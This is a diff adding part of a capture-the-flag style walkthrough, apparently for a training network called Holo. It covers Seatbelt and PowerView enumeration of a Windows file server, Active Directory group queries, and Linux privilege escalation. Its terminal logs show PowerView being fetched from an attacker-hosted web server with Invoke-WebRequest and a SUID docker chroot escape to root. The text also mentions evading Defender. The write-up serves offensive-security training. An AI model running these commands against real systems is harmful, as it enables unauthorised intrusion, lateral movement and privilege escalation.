@@ -5653,3 +5653,1889 @@ ERROR: Unable to collect. Must be an administrator.
   0.0.0.0:49666          0.0.0.0:0              LISTEN     1100  Schedule        svchost.exe
   0.0.0.0:49667          0.0.0.0:0              LISTEN     740   Netlogon        lsass.exe
   0.0.0.0:49668          0.0.0.0:0              LISTEN     2200  Spooler         spoolsv.exe
+  0.0.0.0:49669          0.0.0.0:0              LISTEN     2008  PolicyAgent     svchost.exe
+  0.0.0.0:49670          0.0.0.0:0              LISTEN     732                   services.exe
+  0.0.0.0:49672          0.0.0.0:0              LISTEN     740                   lsass.exe
+  10.200.95.35:139       0.0.0.0:0              LISTEN     4                     System
+  10.200.95.35:445       10.200.95.32:64842     ESTAB      4                     System
+  10.200.95.35:3389      10.200.95.33:57802     ESTAB      1080  TermService     svchost.exe
+  10.200.95.35:49949     10.200.95.30:135       ESTAB      740                   lsass.exe
+  10.200.95.35:49950     10.200.95.30:49667     ESTAB      740                   lsass.exe
+====== TokenPrivileges ======
+
+Current Token's Privileges
+
+                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                SeIncreaseWorkingSetPrivilege:  DISABLED
+====== UAC ======
+
+  ConsentPromptBehaviorAdmin     : 5 - PromptForNonWindowsBinaries
+  EnableLUA (Is UAC enabled?)    : 0
+  LocalAccountTokenFilterPolicy  :
+  FilterAdministratorToken       :
+    [*] UAC is disabled.
+    [*] Any administrative local account can be used for lateral movement.
+====== UdpConnections ======
+
+  Local Address          PID    Service                 ProcessName
+  0.0.0.0:123            1168   W32Time                 svchost.exe
+  0.0.0.0:500            1100   IKEEXT                  svchost.exe
+  0.0.0.0:3389           1080   TermService             svchost.exe
+  0.0.0.0:4500           1100   IKEEXT                  svchost.exe
+  0.0.0.0:5353           532    Dnscache                svchost.exe
+  0.0.0.0:5355           532    Dnscache                svchost.exe
+  10.200.95.35:137       4                              System
+  10.200.95.35:138       4                              System
+  127.0.0.1:57167        740    Netlogon                lsass.exe
+  127.0.0.1:59851        1100   iphlpsvc                svchost.exe
+  127.0.0.1:64922        532    NlaSvc                  svchost.exe
+====== UserRightAssignments ======
+
+Must be an administrator to enumerate User Right Assignments
+====== WifiProfile ======
+
+ERROR:   [!] Terminating exception running command 'WifiProfile': System.DllNotFoundException: Unable to load DLL 'Wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
+   at Seatbelt.Interop.Wlanapi.WlanOpenHandle(UInt32 dwClientVersion, IntPtr pReserved, UInt32& pdwNegotiatedVersion, IntPtr& ClientHandle)
+   at Seatbelt.Commands.Windows.WifiProfileCommand.<Execute>d__10.MoveNext()
+   at Seatbelt.Runtime.ExecuteCommand(CommandBase command, String[] commandArgs)
+====== WindowsAutoLogon ======
+
+  DefaultDomainName              :
+  DefaultUserName                :
+  DefaultPassword                :
+  AltDefaultDomainName           :
+  AltDefaultUserName             :
+  AltDefaultPassword             :
+
+====== WindowsDefender ======
+
+Locally-defined Settings:
+
+GPO-defined Settings:
+====== WindowsEventForwarding ======
+
+====== WindowsFirewall ======
+
+Collecting Windows Firewall Non-standard Rules
+
+Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall
+
+Location                     : SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy
+
+Domain Profile
+    Enabled                  : False
+    DisableNotifications     : True
+    DefaultInboundAction     : ALLOW
+    DefaultOutboundAction    : ALLOW
+
+Public Profile
+    Enabled                  : False
+    DisableNotifications     : True
+    DefaultInboundAction     : ALLOW
+    DefaultOutboundAction    : ALLOW
+
+Standard Profile
+    Enabled                  : False
+    DisableNotifications     : True
+    DefaultInboundAction     : ALLOW
+    DefaultOutboundAction    : ALLOW
+
+====== WMI ======
+
+  AdminPasswordStatus           : 3
+  AutomaticManagedPagefile      : True
+  AutomaticResetBootOption      : True
+  AutomaticResetCapability      : True
+  BootROMSupported              : True
+  BootStatus(UInt16[])          : 0,0,0,127,4,0,127,0,0,0
+  BootupState                   : Normal boot
+  Caption                       : PC-FILESRV01
+  ChassisBootupState            : 3
+  CreationClassName             : Win32_ComputerSystem
+  CurrentTimeZone               : 0
+  Description                   : AT/AT COMPATIBLE
+  DNSHostName                   : PC-FILESRV01
+  Domain                        : holo.live
+  DomainRole                    : 3
+  EnableDaylightSavingsTime     : True
+  FrontPanelResetStatus         : 3
+  HypervisorPresent             : True
+  InfraredSupported             : False
+  KeyboardPasswordStatus        : 3
+  Manufacturer                  : Xen
+  Model                         : HVM domU
+  Name                          : PC-FILESRV01
+  NetworkServerModeEnabled      : True
+  NumberOfLogicalProcessors     : 1
+  NumberOfProcessors            : 1
+  OEMStringArray(String[])      :
+      Xen
+  PartOfDomain                  : True
+  PauseAfterReset               : -1
+  PCSystemType                  : 1
+  PCSystemTypeEx                : 1
+  PowerOnPasswordStatus         : 3
+  PowerState                    : 0
+  PowerSupplyState              : 3
+  PrimaryOwnerName              : EC2
+  ResetCapability               : 1
+  ResetCount                    : -1
+  ResetLimit                    : -1
+  Roles(String[])               :
+      LM_Workstation
+      LM_Server
+      NT
+      Server_NT
+  Status                        : OK
+  SystemType                    : x64-based PC
+  ThermalState                  : 3
+  TotalPhysicalMemory           : 2147074048
+  WakeUpType                    : 6
+
+====== WMIEventConsumer ======
+
+  Name                              :   SCM Event Log Consumer
+  ConsumerType                      :   S-1-5-32-544
+  CreatorSID                        :   NTEventLogEventConsumer
+  Category                          :   0
+  EventID                           :   0
+  EventType                         :   1
+  InsertionStringTemplates          :   System.String[]
+  MachineName                       :
+  MaximumQueueSize                  :
+  Name                              :   SCM Event Log Consumer
+  NameOfRawDataProperty             :
+  NameOfUserSIDProperty             :   sid
+  NumberOfInsertionStrings          :   0
+  SourceName                        :   Service Control Manager
+  UNCServerName                     :
+====== WMIEventFilter ======
+
+  Name                           : SCM Event Log Filter
+  Namespace                      : ROOT\Subscription
+  EventNamespace                 : root\cimv2
+  Query                          : select * from MSFT_SCMEventLogEvent
+  QueryLanguage                  : WQL
+  EventAccess                    :
+  CreatorSid                     : S-1-5-32-544
+
+====== WMIFilterBinding ======
+
+  Consumer                       : __EventFilter.Name="SCM Event Log Filter"
+  Filter                         : NTEventLogEventConsumer.Name="SCM Event Log Consumer"
+  CreatorSID                     : S-1-5-32-544
+
+====== WSUS ======
+
+  UseWUServer                    : False
+  Server                         :
+  AlternateServer                :
+  StatisticsServer               :
+
+[*] Completed collection in 7.878 seconds
+```
+What CLR version is installed on PC-FILESRV01?
+PowerShell module
+*4.0.30319*
+What PowerShell version is installed on PC-FILESRV01?
+PowerShell module
+*5.1.17763.1*
+What Windows build is PC-FILESRV01 running on?
+OSInfo module
+*17763.1577*
+### Situational Awareness ALL THE POWER!
+Now that we understand detections and system surface on the endpoint, we can begin looking at the user and groups of the system. This step of situational awareness can allow us to find privileges and user connections for future horizontal movement or privilege escalation.
+The first tool we will be looking at is PowerView, [https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon). This tool is no longer supported but is still considered a standard for enumeration. From the PowerSploit GitHub, "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows "net *" commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality."
+To use the script, we will first need to import it then run the commands that we want to enumerate the endpoint. Find syntax and a few essential commands you can use with PowerView.
+Syntax: `Import-Module .\PowerView.ps1`
+We can now run all of the commands that PowerView offers. In this task, we will be focusing on enumerating the local user and group policy surface. In the next task, we will use native PowerShell to enumerate the active directory surface. Outlined below is a list of commands we will cover in this task.
+-   `Get-NetLocalGroup`
+-   `Get-NetLocalGroupMember`
+-   `Get-NetLoggedon`
+-   `Get-DomainGPO`
+-   `Find-LocalAdminAccess`
+For a complete list of commands, check out the GitHub readme, [https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview)
+---
+The first PowerView command we will be looking at is `Get-NetLocalGroup`; this command will enumerate/list all groups present on a local machine/computer. Find the syntax and output for the command below.
+Syntax: `Get-NetLocalGroup`
+![](https://i.imgur.com/rOtpUMS.png)
+The second PowerView command we will be looking at is `Get-NetLocalGroupMember`; this command will enumerate/list all members of a local group such as users, computers, or service accounts. Find the syntax and output for the command below.
+Syntax: `Get-NetLocalGroupMember -Group <group>`
+![](https://i.imgur.com/yTz4g0i.png)
+The third PowerView command we will be looking at is `Get-NetLoggedon`; this command will enumerate/list all users currently logged onto the local machine/computer. This can be useful to identify what user's not to take over or what users to target in phishing or other attacks depending on your team's methodology and/or goals. Find the syntax and output for the command below.
+Syntax: `Get-NetLoggedon`
+![](https://i.imgur.com/HLdiknL.png)
+The fourth PowerView command we will be looking at is `Get-DomainGPO`; this command will enumerate/list the active directory domain GPOs installed on the local machine. This can be useful in identifying utilities like AppLocker or other remote services running on the machine/computer. Find the syntax and output for the command below.
+Syntax: `Get-DomainGPO`
+![](https://i.imgur.com/GsBGwf9.png)
+The final PowerView command we will be looking at is `Find-LocalAdminAccess`; this command will check all hosts connected to the domain a machine/computer is a part of and check if the current user or listed user is a local administrator. This can be helpful when targeting a specific user and attempting to move across the domain laterally. This can be used as an alternative to other tools like CME for passing the hash. Find the syntax and output for the command below.
+Syntax: `Find-LocalAdminAccess`
+![](https://i.imgur.com/g2YtRHu.png)
+For a complete list of commands and cheat-sheets, check out the following resources,
+-   [](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)[https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+-   [](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview)[https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview)
+-   [](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)[https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
+To run PowerView in Covenant, we can utilize `PowerShellImport` mentioned in Task 25.
+As with most offensive tooling, Defender detects this script. You will need to follow the methodology given in Task 31-36 to execute this tool and evade detections.
+Answer the questions below
+Read the above and enumerate PC-FILESRV01 using PowerView.
+Completed
+```text
+┌──(kali㉿kali)-[~/Holo/Ghostpack-CompiledBinaries]
+└─$ locate PowerView    
+/home/kali/.local/lib/python3.10/site-packages/pwncat/data/PowerSploit/Recon/PowerView.ps1
+/home/kali/.local/lib/python3.10/site-packages/pwncat/data/PowerSploit/docs/Recon/Export-PowerViewCSV.md
+/home/kali/Downloads/pentest_python/pentest_ps/PowerView.ps1
+/home/kali/pwncat-env/lib/python3.10/site-packages/pwncat/data/PowerSploit/Recon/PowerView.ps1
+/home/kali/pwncat-env/lib/python3.10/site-packages/pwncat/data/PowerSploit/docs/Recon/Export-PowerViewCSV.md
+/usr/share/windows-resources/powersploit/Recon/PowerView.ps1
+```
+```text
+┌──(kali㉿kali)-[~/Holo/Ghostpack-CompiledBinaries]
+└─$ cp /home/kali/Downloads/pentest_python/pentest_ps/PowerView.ps1 PowerView.ps1
+```
+```text
+┌──(kali㉿kali)-[~/Holo/Ghostpack-CompiledBinaries]
+└─$ python3 -m http.server 8000                                                  
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.200.95.35 - - [06/Feb/2023 21:52:17] "GET /PowerView.ps1 HTTP/1.1" 200 -
+
+PS C:\Windows\Tasks> Invoke-WebRequest http://10.50.74.15:8000/PowerView.ps1 -outfile C:\Windows\Tasks\PowerView.ps1
+
+PS C:\Windows\Tasks> Import-Module .\PowerView.ps1
+
+PS C:\Windows\Tasks> Get-NetLocalGroup
+
+ComputerName GroupName                           Comment
+------------ ---------                           -------
+PC-FILESRV01 Access Control Assistance Operators Members of this group can remotely query authorization attributes a...
+PC-FILESRV01 Administrators                      Administrators have complete and unrestricted access to the compute...
+PC-FILESRV01 Backup Operators                    Backup Operators can override security restrictions for the sole pu...
+PC-FILESRV01 Certificate Service DCOM Access     Members of this group are allowed to connect to Certification Autho...
+PC-FILESRV01 Cryptographic Operators             Members are authorized to perform cryptographic operations.
+PC-FILESRV01 Device Owners                       Members of this group can change system-wide settings.
+PC-FILESRV01 Distributed COM Users               Members are allowed to launch, activate and use Distributed COM obj...
+PC-FILESRV01 Event Log Readers                   Members of this group can read event logs from local machine
+PC-FILESRV01 Guests                              Guests have the same access as members of the Users group by defaul...
+PC-FILESRV01 Hyper-V Administrators              Members of this group have complete and unrestricted access to all ...
+PC-FILESRV01 IIS_IUSRS                           Built-in group used by Internet Information Services.
+PC-FILESRV01 Network Configuration Operators     Members in this group can have some administrative privileges to ma...
+PC-FILESRV01 Performance Log Users               Members of this group may schedule logging of performance counters,...
+PC-FILESRV01 Performance Monitor Users           Members of this group can access performance counter data locally a...
+PC-FILESRV01 Power Users                         Power Users are included for backwards compatibility and possess li...
+PC-FILESRV01 Print Operators                     Members can administer printers installed on domain controllers
+PC-FILESRV01 RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where ...
+PC-FILESRV01 RDS Management Servers              Servers in this group can perform routine administrative actions on...
+PC-FILESRV01 RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and person...
+PC-FILESRV01 Remote Desktop Users                Members in this group are granted the right to logon remotely
+PC-FILESRV01 Remote Management Users             Members of this group can access WMI resources over management prot...
+PC-FILESRV01 Replicator                          Supports file replication in a domain
+PC-FILESRV01 Storage Replica Administrators      Members of this group have complete and unrestricted access to all ...
+PC-FILESRV01 System Managed Accounts Group       Members of this group are managed by the system.
+PC-FILESRV01 Users                               Users are prevented from making accidental or intentional system-wi...
+
+PS C:\Windows\Tasks> Get-NetLocalGroupMember -Group Administrators
+
+ComputerName : PC-FILESRV01
+GroupName    : Administrators
+MemberName   : PC-FILESRV01\Administrator
+SID          : S-1-5-21-4241685735-4112329853-1893400299-500
+IsGroup      : False
+IsDomain     : False
+
+ComputerName : PC-FILESRV01
+GroupName    : Administrators
+MemberName   : HOLOLIVE\Domain Admins
+SID          : S-1-5-21-471847105-3603022926-1728018720-512
+IsGroup      : True
+IsDomain     : True
+
+PS C:\Windows\Tasks> Get-NetLoggedon
+
+UserName     : watamet
+LogonDomain  : HOLOLIVE
+AuthDomains  :
+LogonServer  : DC-SRV01
+ComputerName : localhost
+
+UserName     : PC-FILESRV01$
+LogonDomain  : HOLOLIVE
+AuthDomains  :
+LogonServer  :
+ComputerName : localhost
+
+UserName     : PC-FILESRV01$
+LogonDomain  : HOLOLIVE
+AuthDomains  :
+LogonServer  :
+ComputerName : localhost
+
+UserName     : PC-FILESRV01$
+LogonDomain  : HOLOLIVE
+AuthDomains  :
+LogonServer  :
+ComputerName : localhost
+
+UserName     : PC-FILESRV01$
+LogonDomain  : HOLOLIVE
+AuthDomains  :
+LogonServer  :
+ComputerName : localhost
+
+UserName     : PC-FILESRV01$
+LogonDomain  : HOLOLIVE
+AuthDomains  :
+LogonServer  :
+ComputerName : localhost
+
+UserName     : PC-FILESRV01$
+LogonDomain  : HOLOLIVE
+AuthDomains  :
+LogonServer  :
+ComputerName : localhost
+
+GPO stands for "Group Policy Object". It is a collection of settings in Microsoft Windows that define what a system will look like and how it will behave for a defined group of users. GPOs can be used to configure security options, install software, and apply patches, among other tasks. They are typically managed by administrators in a domain-based network and are used to enforce a consistent configuration across multiple computers.
+
+PS C:\Windows\Tasks> Get-DomainGPO
+
+usncreated               : 5672
+systemflags              : -1946157056
+displayname              : Default Domain Policy
+gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EA
+                           C-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00
+                           C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
+whenchanged              : 12/31/2021 1:08:39 AM
+objectclass              : {top, container, groupPolicyContainer}
+gpcfunctionalityversion  : 2
+showinadvancedviewonly   : True
+usnchanged               : 2147368
+dscorepropagationdata    : {10/23/2020 1:33:58 AM, 10/22/2020 11:43:31 PM, 1/1/1601 12:00:00 AM}
+name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
+flags                    : 0
+cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
+iscriticalsystemobject   : True
+gpcfilesyspath           : \\holo.live\sysvol\holo.live\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
+distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=holo,DC=live
+whencreated              : 10/22/2020 11:41:59 PM
+versionnumber            : 71
+instancetype             : 4
+objectguid               : 5d03de40-73dd-48d7-8eb7-90a633113913
+objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=holo,DC=live
+
+usncreated               : 5675
+systemflags              : -1946157056
+displayname              : Default Domain Controllers Policy
+gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
+whenchanged              : 8/31/2021 4:24:11 AM
+objectclass              : {top, container, groupPolicyContainer}
+gpcfunctionalityversion  : 2
+showinadvancedviewonly   : True
+usnchanged               : 1952694
+dscorepropagationdata    : {10/23/2020 1:33:58 AM, 10/22/2020 11:43:31 PM, 1/1/1601 12:00:00 AM}
+name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}
+flags                    : 0
+cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
+iscriticalsystemobject   : True
+gpcfilesyspath           : \\holo.live\sysvol\holo.live\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
+distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=holo,DC=live
+whencreated              : 10/22/2020 11:41:59 PM
+versionnumber            : 22
+instancetype             : 4
+objectguid               : 18a7cb1f-a6d4-4014-8e4b-8a6af2662d8a
+objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=holo,DC=live
+
+PS C:\Windows\Tasks> Find-LocalAdminAccess
+S-SRV01.holo.live
+```
+### Situational Awareness Import-Module PowerUpGreySkull.ps1
+In some instances, depending on detections and restrictions within the endpoint, you may not run tools like Seatbelt and PowerView. In this case, we can utilize offensive PowerShell commands to perform situational awareness. In addition, Powershell natively supports several modules and commands that we can use to gain situational awareness and enumerate the system/environment.
+We will only be covering a small surface of what PowerShell is capable of. Look below for an outline of commands and modules we will cover in this task.
+-   `Get-ScheduledTask`
+-   `Get-ScheduledTaskInfo`
+-   `whoami /priv`
+-   `Get-ADGroup`
+-   `Get-ADGroupMember`
+-   `Get-ADPrincipalGroupMembership`
+You will notice that most of the modules are focused on active directory structure; this is because the active directory plug-in/modules give us a large amount of control designed for system administrators. The first two commands we will be looking at are aimed towards identifying misconfigurations we can abuse for privilege escalation.
+---
+The first PowerShell command we will be looking at is `Get-ScheduledTask`; as the command says it will list/enumerate all the scheduled tasks present on the system. To list all tasks, there are no parameters needed to pass to the command. Find syntax for the command below.
+Syntax: `Get-ScheduledTask`
+![](https://i.imgur.com/WnnyiFo.png)
+You will notice that there is a large number of tasks present; this is because Windows operates at startup with a large number of tasks default on every Windows install. We can use filters and parameters to eliminate some of the unneeded tasks to focus on obscure tasks that we can abuse. Find syntax for filtering below.
+Syntax: `Get-ScheduledTask -TaskPath "\Users\*"`
+![](https://i.imgur.com/RLPeilx.png)
+You can experiment with parameters and inputs to get the most optimal output for system enumeration.
+For more information about `Get-ScheduledTask`, check out the Microsoft docs, [https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask)
+The second PowerShell command we will be looking at is `Get-ScheduledTaskInfo`; similar to Get-ScheduledTask, this command will list specific information on specified Tasks allowing the attacker to identify the task and how it could be exploited. Find syntax for the command below.
+Syntax: `Get-ScheduledTaskInfo -TaskName <Full Path>`
+![](https://i.imgur.com/Uep9xif.png)
+For more information about Get-ScheduledTaskInfo, check out the Microsoft docs, [https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtaskinfo](https://docs.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtaskinfo)
+The third command, `whomai /priv`; isn't specific to PowerShell, but can help us with privilege escalation enumeration, as there are many exploits available with misconfigured privileges. The `/priv` parameter will enumerate the _SE privileges_ of the current user. Find the command used and output below.
+Command: `whoami /priv`
+![](https://i.imgur.com/2Sh2OlE.png)
+For more information on how to exploit these privileges, check out these slides,
+---
+The fourth PowerShell command we will be looking at is `Get-ADGroup`; this module, part of the active directory module package, will allow us to enumerate a user's groups or all groups within the domain. To get the most out of this command, we will already need to enumerate the users present on the machine. Since this command is part of the ActiveDirectory module, you will need first to import the module. Find the syntax for the command below.
+Syntax: `Import-Module ActiveDirectory; Get-ADGroup`
+After running the command, you will be prompted with a CLI to apply filters to the command; we recommend filtering by the `samAccountName`. Find example usage for this filter below.
+Syntax: `samAccountName -like "*"`
+![](https://i.imgur.com/hzBe6IH.png)
+To get the most out of this command, you will need to play with the filters and parameters used to get the most efficient output to enumerate the critical information.
+For more information about `Get-ADGroup`, check out the Microsoft docs, [https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adgroup](https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adgroup)
+The fifth PowerShell command we will be looking at is `Get-ADGroupMember`; similar to `Get-ADGroup`, this command will list the members of an active directory group. Once you have enumerated groups present on the domain, this command can be helpful to identify specific users that you can target, whether it be for privilege escalation or lateral movement. Since this command is part of the _ActiveDirectory_ module, you will need first to import the module. Find the syntax for the command below.
+Syntax: `Import-Module ActiveDirectory; Get-ADGroupMember`
+After running the command, you will be prompted with a CLI to specify the group(s) you want to enumerate. As previously stated, you can get the groups from the previous enumeration with `Get-ADGroup`.
+![](https://i.imgur.com/1UwaNQf.png)
+For more information about Get-ADGroupMember, check out the Microsoft docs, [https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adgroupmember](https://docs.microsoft.com/en-us/powershell/module/addsadministration/get-adgroupmember)
+The final PowerShell command we will be looking at is `Get-ADPrincipalGroupMembership`, similar to `Get-ADGroupMember`, this command will retrieve the groups a user, computer group, or service account is a member of. In order to get the most out of this command we will need to already have some targeted users enumerated using other commands like `Get-ADUser`. Since this command is part of the `ActiveDirectory` module you will need to first import the module. Find the syntax for the command below.
+The final PowerShell command we will be looking at is `Get-ADPrincipalGroupMembership`; similar to `Get-ADGroupMember`; this command will retrieve the groups a user, computer group, or service account is a member. To get the most out of this command, we will need to have enumerated target users using other commands like `Get-ADUser`. Since this command is part of the _ActiveDirectory_ module, you will need first to import the module. Find the syntax for the command below.
+Syntax: `Import-Module ActiveDirectory; Get-ADPrincipalGroupMembership`
+After running the command, you will be prompted with a CLI to specify the user(s) you want to enumerate.
+![](https://i.imgur.com/m1addqf.png)
+When using PowerShell for offensive operations, you will need to play around with the commands and modules to see what works for you and develop your methodology similar to working with other tools.
+Answer the questions below
+Read the above and enumerate PC-FILESRV01 using PowerShell.
+Completed
+
+## Privilege Escalation
+**Note:** Please be mindful of other users trying to proceed in the network. Please do not stop the Docker container from running. It will prevent users from proceeding throughout the network. Also, please clean up after yourself. If you transfer a docker container image to the VM, remember to remove it after you finish elevating privileges.
+Now that we have a shell on L-SRV01 and escaped the container, we need to perform local privilege escalation to gain root on the box.
+Local privilege escalation is when you take your average level user access and exploit misconfigurations and applications to gain privileged level access. This is typically done by exploiting a specific application or service that was misconfigured on the device.
+Several resources can help you through privilege escalation on Linux. Some of these resources are outlined below for you to use.
+-   [](https://book.hacktricks.xyz/linux-unix/privilege-escalation)[https://book.hacktricks.xyz/linux-unix/privilege-escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
+-   [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)[https://github.com/swisskyrepo/PayloadsAllTheThings/](https://github.com/swisskyrepo/PayloadsAllTheThings/)
+-   [](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
+In this task, we will be covering one specific privilege escalation technique and a script that we can use to speed along the process of finding misconfigurations we can exploit.
+We will utilize a script called Linpeas to run a thorough check of potential exploits to begin our privilege escalation attempts. [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).
+To use Linpeas, we need to download the script from the repository above on our attacking machine. Then we can utilize a web hosting service such as http.server, updog, or php to host the file onto the target machine. Linpeas does not require any arguments or parameters to run; you only need to run it as a standard binary.
+Syntax: `./linpeas.sh`
+Linpeas may take around 5-10 minutes to complete. Once complete, you would need to parse through the output and look for any potentially valuable information.
+The specific exploit that we will be looking at is abusing the SUID bit set on binaries. From [linux.com](http://linux.com/) "SUID (Set owner User ID upon execution) is a special type of file permissions given to a file. Normally in Linux/Unix when a program runs, it inherits access permissions from the logged-in user. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather than the user who runs it." This means that if the program or file is running as root and we have access to it, we can abuse it to grant us root-level access. Below you can find what the SUID bit looks like, along with a table of other bits that can be set.
+![](https://i.imgur.com/LN2uOCJ.png)
+**Permission**
+**On Files**
+**On Directories**
+SUID Bit
+User executes the file with permissions of the _file_ owner
+-
+SGID Bit
+User executes the file with the permission of the _group_ owner.
+File created in directory gets the same group owner.
+Sticky Bit
+No meaning
+Users are prevented from deleting files from other users.
+Besides using Linpeas to find the files with a SUID bit, you can also use a bash one-liner shown below to search for files with this bit set.
+Command: `find / -perm -u=s -type f 2>/dev/null`
+Once we have identified a file that we thank may be exploitable, we need to search for an exploit for it. A helpful resource to search for exploits on specific applications and programs is GTFOBins, [https://gtfobins.github.io/](https://gtfobins.github.io/).
+An example of an exploit can be found below for a dig SUID. Exploits may vary between each application and vulnerability as each has its unique ways security researchers have found they can be abused.
+![](https://i.imgur.com/alLGI6R.png)
+If successful, you should now have the same permission levels as the binary you exploited.
+Answer the questions below
+```rust
+www-data@ip-10-200-108-33:/var/www$ find / -perm -u=s -type f 2>/dev/null | xargs ls -lah
+<nd / -perm -u=s -type f 2>/dev/null | xargs ls -lah
+-rwsr-sr-x 1 daemon daemon      55K Nov 12  2018 /usr/bin/at
+-rwsr-xr-x 1 root   root        84K May 28  2020 /usr/bin/chfn
+-rwsr-xr-x 1 root   root        52K May 28  2020 /usr/bin/chsh
+-rwsr-xr-x 1 root   root        82M Oct 14  2020 /usr/bin/docker
+-rwsr-xr-x 1 root   root        39K Mar  7  2020 /usr/bin/fusermount
+-rwsr-xr-x 1 root   root        87K May 28  2020 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root        55K Jul 21  2020 /usr/bin/mount
+-rwsr-xr-x 1 root   root        44K May 28  2020 /usr/bin/newgrp
+-rwsr-xr-x 1 root   root        67K May 28  2020 /usr/bin/passwd
+-rwsr-xr-x 1 root   root        31K May 26  2021 /usr/bin/pkexec
+-rwsr-xr-x 1 root   root        67K Jul 21  2020 /usr/bin/su
+-rwsr-xr-x 1 root   root       163K Jan 19  2021 /usr/bin/sudo
+-rwsr-xr-x 1 root   root        39K Jul 21  2020 /usr/bin/umount
+-rwsr-xr-- 1 root   messagebus  51K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root   root        15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root   root       463K Mar  9  2021 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root   root        23K May 26  2021 /usr/lib/policykit-1/polkit-agent-helper-1
+
+/usr/bin/docker
+
+www-data@ip-10-200-108-33:/var/www$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+<www$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@ip-10-200-108-33:/var/www$ docker images
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+<none>              <none>              cb1b741122e8        2 years ago         995MB
+<none>              <none>              b711fc810515        2 years ago         993MB
+<none>              <none>              591bb8cd4ef6        2 years ago         993MB
+<none>              <none>              88d15ba62bf4        2 years ago         993MB
+ubuntu              18.04               56def654ec22        2 years ago         63.2MB
+
+gtfobins
+
+sudo install -m =xs $(which docker) .
+
+./docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+/usr/bin/docker run -v /:/mnt --rm -it 56def654ec22 chroot /mnt sh
+
+or
+
+docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh -p
+
+www-data@ip-10-200-108-33:/var/www$ docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh -p
+<n -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh -p
+```
+```rust
+# whoami
+whoami
+root
+```
+```rust
+# bash
+bash
+            .-/+oossssoo+/-.               root@85e950a1a8ca 
+        `:+ssssssssssssssssss+:`           ----------------- 
+      -+ssssssssssssssssssyyssss+-         OS: Ubuntu 20.04.1 LTS x86_64 
+    .ossssssssssssssssssdMMMNysssso.       Host: HVM domU 4.2.amazon 
+   /ssssssssssshdmmNNmmyNMMMMhssssss/      Kernel: 5.4.0-1030-aws 
+  +ssssssssshmydMMMMMMMNddddyssssssss+     Uptime: 48 mins 
